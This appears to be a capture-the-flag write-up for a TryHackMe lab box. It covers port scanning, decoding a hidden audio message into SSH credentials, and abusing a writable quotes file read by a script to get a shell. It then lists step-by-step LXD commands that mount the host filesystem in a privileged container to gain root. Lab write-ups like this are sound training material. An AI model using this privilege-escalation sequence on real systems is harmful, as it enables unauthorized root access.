# Introduction

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx botc.thm
```

# Enumeration

we do a nmap with some options :\
\
-T4 is for have more threads to accelerate the scan\
-p- is to scan all the ports\
-sV is to scan the version\
\
we run the scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- botc.thm
```

we got these open ports
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

decode the mp3 file with audacity by displaying the spectrum : 

we can cipher vigenere decode with the word : namelesstwo

<img width="868" alt="image" src="https://github.com/MaTe0r/tryhackme.com/assets/94843357/8a2b3612-9de9-451b-8af0-a50b43645377">



Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes

we can use to connect to ssh with weston user and this password : Mydadisghostrideraintthatcoolnocausehesonfirejokes

once connected, we are in the cage groups\
we can edit the file /opt/.dads_script/.files/.quotes\
this file is used by a cage script owner to do a wall of a random quote in the .quotes file

then we got a reverse shell with cage user\
now let's go to root with lxd ! we are in the group 


```
# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default 
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

now we are root, we can flag in email backup
